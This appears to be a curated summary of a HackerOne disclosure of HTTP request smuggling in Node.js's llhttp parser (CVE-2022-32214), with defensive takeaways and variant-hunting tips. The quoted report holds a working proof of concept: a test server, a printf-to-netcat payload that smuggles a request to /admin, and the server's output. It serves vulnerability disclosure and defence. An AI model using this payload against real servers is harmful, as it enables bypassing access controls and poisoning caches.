# HTTP Request Smuggling Due To Improper Delimiting of Header Fields in Node.js llhttp Parser

## Metadata
- **Source:** HackerOne
- **Report:** 1524692 | https://hackerone.com/reports/1524692
- **Submitted:** 2022-03-28
- **Reporter:** zeyu2001
- **Program:** Node.js / HackerOne
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** HTTP Request Smuggling, RFC7230 Non-Compliance, Improper Input Validation, Header Parsing Bypass
- **CVEs:** CVE-2022-32214
- **Category:** uncategorised

## Summary
The llhttp parser in Node.js v17.8.0 accepts LF character alone as header field delimiter instead of requiring RFC7230-compliant CRLF sequences. This allows attackers to inject additional HTTP headers that are parsed by Node.js but not recognized by upstream proxies, enabling HTTP request smuggling attacks. The vulnerability can be exploited when an upstream server correctly enforces CRLF but incorrectly permits LF in header values.

## Attack scenario
1. Attacker crafts a malicious HTTP request with a header field delimited by LF instead of CRLF
2. The embedded LF character terminates a header field prematurely in the Node.js parser
3. A hidden Content-Length header is injected after the LF character
4. Upstream proxy sees the original request structure (CRLF-delimited) and treats the entire payload as single request
5. Node.js parser interprets the request as containing multiple headers, including the injected Content-Length
6. Subsequent request body data is interpreted as a separate HTTP request, allowing request smuggling to target application

## Root cause
The llhttp parser implementation does not strictly enforce RFC7230 section 3 requirement that HTTP header fields must be delimited by CRLF (Carriage Return + Line Feed) sequences. The parser accepts LF alone as a valid delimiter, creating a parsing discrepancy when upstream proxies enforce stricter CRLF validation while allowing LF in header values.

## Attacker mindset
An attacker would recognize the parsing discrepancy between strict RFC-compliant proxies and lenient Node.js servers as an opportunity for request smuggling. By injecting headers via LF characters, they can cause divergent request interpretation, potentially bypassing security controls, poisoning caches, or performing unauthorized actions on behalf of legitimate users.

## Defensive takeaways
- Always enforce RFC7230 strict header field delimiting (CRLF only, not LF alone) in all HTTP parsers
- Implement defense-in-depth with consistent parsing rules across all layers (proxies, servers, applications)
- Validate that upstream and downstream components use identical header parsing logic to prevent request smuggling
- Disable HTTP/1.0 keep-alive and use HTTP/1.1 with explicit Connection headers to limit smuggling attack surface
- Normalize and validate all HTTP headers before processing, rejecting requests with ambiguous formatting
- Monitor for requests with mixed CRLF/LF delimiters as these indicate potential smuggling attempts
- Apply security patches to HTTP parsing libraries (llhttp) immediately upon release
- Test HTTP parsing logic with fuzzing tools that include malformed delimiters and mixed line endings

## Variant hunting
Search for similar header parsing bypasses in other Node.js versions, alternative HTTP parsers (http-parser, picohttpparser), reverse proxies (nginx, Apache), and API gateways. Look for implementations that accept LF, CR, or other non-standard delimiters. Test variations using: header folding/unfolding, tab characters as delimiters, multiple consecutive delimiters, null bytes, and Unicode whitespace characters. Examine Content-Length vs Transfer-Encoding conflicts combined with delimiter confusion.

## MITRE ATT&CK
- T1190
- T1202
- T1598
- T1110
- T1021

## Notes
This vulnerability demonstrates a critical interoperability issue where strict RFC compliance on one component (upstream proxy) combined with lenient parsing on another (Node.js) creates a security gap. The attack requires control over the network path or ability to inject requests at the application level. The issue was patched in later Node.js versions by enforcing strict CRLF delimiting in llhttp. Request smuggling variants remain a persistent threat class requiring constant vigilance across the entire request processing pipeline.

## Full report
<details><summary>Expand</summary>

**Summary:**

The `llhttp` parser in the `http` module in Node v17.8.0 does not strictly use the CRLF sequence to delimit HTTP requests. This can lead to HTTP Request Smuggling (HRS).

**Description:**

The LF character (without CR) is sufficient to delimit HTTP header fields in the `lihttp` parser. According to [RFC7230 section 3](https://datatracker.ietf.org/doc/html/rfc7230#section-3), only the CRLF sequence should delimit each `header-field`.

Consider the following request (all lines are delimited by CRLF except the `[\n]` part)

```http
GET / HTTP/1.1
Host: localhost
Dummy: x[\n]Content-Length: 23

GET / HTTP/1.1
Dummy: GET /admin HTTP/1.1
Host: localhost

```

Suppose that an upstream server:
- Correctly delimits lines by the CRLF sequence instead of only LF
- Incorrectly allows the LF character in header values

This leads to HTTP request smuggling as the Node server sees one extra header field, `Content-Length: 23` while the upstream proxy thinks that the content length of the first request is 0.

Request as seen by the Node server:

```http
GET / HTTP/1.1
Host: localhost
Dummy: x
Content-Length: 23

GET / HTTP/1.1
Dummy: GET /admin HTTP/1.1
Host: localhost

```

## Steps To Reproduce:

Server code I used for testing:

```javascript
const http = require('http');

http.createServer((request, response) => {
   let body = [];
   request.on('error', (err) => {
      response.end("error while reading body: " + err)
   }).on('data', (chunk) => {
      body.push(chunk);
   }).on('end', () => {
   body = Buffer.concat(body).toString();
   
   response.on('error', (err) => {
      response.end("error while sending response: " + err)
   });

   response.end(JSON.stringify({
         "URL": request.url,
         "Headers": request.headers,
         "Length": body.length,
         "Body": body,
      }) + "\n");
   });
}).listen(80);
```

Payload:

```bash
(printf "GET / HTTP/1.1\r\n"\
"Host: localhost\r\n"\
"Dummy: x\nContent-Length: 23\r\n"\
"\r\n"\
"GET / HTTP/1.1\r\n"\
"Dummy: GET /admin HTTP/1.1\r\n"\
"Host: localhost\r\n"\
"\r\n"\
"\r\n") | nc localhost 80
```

**Expected result:** Sees two requests, both to `/`.

**Actual result:** Sees one request to `/` and another to `/admin`.

```http
HTTP/1.1 200 OK
Date: Mon, 28 Mar 2022 15:51:44 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 124

{"URL":"/","Headers":{"host":"localhost","dummy":"x","content-length":"23"},"Length":23,"Body":"GET / HTTP/1.1\r\nDummy: "}
HTTP/1.1 200 OK
Date: Mon, 28 Mar 2022 15:51:44 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 69

{"URL":"/admin","Headers":{"host":"localhost"},"Length":0,"Body":""}
```

## Impact

Depending on the specific web application, HRS can lead to cache poisoning, bypassing of security layers, stealing of credentials and so on.

</details>

---
*Analysed by Claude on 2026-05-24*
